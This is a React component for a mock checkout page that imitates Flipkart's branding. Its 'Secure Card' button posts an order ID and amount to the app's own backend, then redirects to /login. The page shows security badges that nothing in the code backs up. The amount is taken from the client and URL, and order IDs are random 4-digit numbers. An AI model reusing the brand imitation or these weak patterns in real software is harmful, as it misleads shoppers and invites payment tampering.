import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import axios from "axios";
import { getApiUrl } from "../config/api";
import "./payment.css";

function Payment() {
  const [searchParams] = useSearchParams();
  const [amount, setAmount] = useState(searchParams.get("amount") || "");
  const [orderId, setOrderId] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Generate random 4-digit order ID on component mount
  useEffect(() => {
    const randomOrderId = Math.floor(1000 + Math.random() * 9000).toString();
    setOrderId(randomOrderId);
  }, []);

  const handleSecureCardPayment = async (e) => {
    e.preventDefault();
    
    // Prevent multiple submissions
    if (loading) {
      return;
    }
    
    if (!amount || parseFloat(amount) <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    setError("");
    setLoading(true);

    try {
      let res =await axios.post(
        getApiUrl("/payment"),
        new URLSearchParams({
          orderId: orderId,
          amount: amount
        }),
        {
          withCredentials: true,
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          }
        }
      );
      console.log("res.data", res.data);
      window.location.href = `/login`;
    } catch (err) {
      console.log(err.response?.data?.message);
      setError(err.response?.data?.message || "Payment failed. Please try again.");
      setLoading(false);
    }
  };

  return (
    <div className="payment-page">
      {/* Flipkart Header */}
      <header className="flipkart-header">
        <div className="header-container">
          <div className="flipkart-logo">
            <span className="logo-text">Flipkart</span>
            <span className="logo-explore">Explore</span>
            <span className="logo-plus">Plus</span>
          </div>
          <div className="header-right">
            <span className="secure-badge">🔒 Secure</span>
          </div>
        </div>
      </header>

      <div className="payment-container">
        <div className="payment-content">
          {/* Left Side - Order Summary */}
          <div className="order-summary">
            <h2>Order Summary</h2>
            
            <div className="amount-input-section">
              <label htmlFor="amount-input">Enter Amount (₹)</label>
              <input
                id="amount-input"
                type="number"
                min="1"
                step="0.01"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="amount-input"
              />
            </div>

            {error && <div className="error-message">{error}</div>}

            <div className="summary-card">
              <div className="summary-row">
                <span>Order ID:</span>
                <strong>{orderId || "Generating..."}</strong>
              </div>
              <div className="summary-row">
                <span>Amount:</span>
                <strong className="amount">
                  {amount ? `₹${amount}` : "₹0"}
                </strong>
              </div>
              <div className="summary-divider"></div>
              <div className="summary-row total">
                <span>Total Amount:</span>
                <strong className="total-amount">
                  {amount ? `₹${amount}` : "₹0"}
                </strong>
              </div>
            </div>

            <div className="delivery-info">
              <div className="info-item">
                <span className="info-icon">📦</span>
                <div>
                  <div className="info-label">Delivery by</div>
                  <div className="info-value">Tomorrow, 10 AM - 2 PM</div>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side - Payment Methods */}
          <div className="payment-methods">
            <h2>Select Payment Method</h2>

            <div className="payment-options">
              {/* Credit/Debit Cards */}
              <div className="payment-section">
                <div className="section-header">
                  <span className="section-icon">💳</span>
                  <span className="section-title">Credit/Debit Cards</span>
                </div>
                <div className="payment-option">
                  <div className="option-content">
                    <span className="option-icon">💳</span>
                    <span className="option-text">Add new card</span>
                  </div>
                  <span className="option-arrow">›</span>
                </div>
              </div>

              {/* UPI */}
              <div className="payment-section">
                <div className="section-header">
                  <span className="section-icon">📱</span>
                  <span className="section-title">UPI</span>
                </div>
                <div className="payment-option">
                  <div className="option-content">
                    <span className="option-icon">📱</span>
                    <span className="option-text">Pay via UPI</span>
                  </div>
                  <span className="option-arrow">›</span>
                </div>
              </div>

              {/* Wallets */}
              <div className="payment-section">
                <div className="section-header">
                  <span className="section-icon">👛</span>
                  <span className="section-title">Wallets</span>
                </div>
                <div className="payment-option">
                  <div className="option-content">
                    <span className="option-icon">💰</span>
                    <span className="option-text">PhonePe</span>
                  </div>
                  <span className="option-arrow">›</span>
                </div>
                <div className="payment-option">
                  <div className="option-content">
                    <span className="option-icon">💰</span>
                    <span className="option-text">Paytm</span>
                  </div>
                  <span className="option-arrow">›</span>
                </div>
              </div>

              {/* Our Custom Payment Option */}
              <div className="payment-section custom-payment">
                <div className="section-header">
                  <span className="section-icon">🔐</span>
                  <span className="section-title">Secure Payment</span>
                </div>
                <button
                  onClick={handleSecureCardPayment}
                  disabled={loading || !amount || parseFloat(amount) <= 0}
                  className="payment-option secure-card-option"
                >
                  <div className="option-content">
                    <span className="option-icon">💳</span>
                    <div className="option-details">
                      <span className="option-text">
                        {loading ? "Processing..." : "Pay using Secure Card"}
                      </span>
                      <span className="option-subtext">Fast & Secure Payment</span>
                    </div>
                  </div>
                  <span className="option-arrow">›</span>
                </button>
              </div>

              {/* Net Banking */}
              <div className="payment-section">
                <div className="section-header">
                  <span className="section-icon">🏦</span>
                  <span className="section-title">Net Banking</span>
                </div>
                <div className="payment-option">
                  <div className="option-content">
                    <span className="option-icon">🏦</span>
                    <span className="option-text">Select Bank</span>
                  </div>
                  <span className="option-arrow">›</span>
                </div>
              </div>
            </div>

            {/* Security Footer */}
            <div className="security-footer">
              <div className="security-badges">
                <span className="badge">🔒 Secure</span>
                <span className="badge">🛡️ Protected</span>
                <span className="badge">✓ Verified</span>
              </div>
              <p className="security-text">
                Your payment information is secure and encrypted
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Payment;
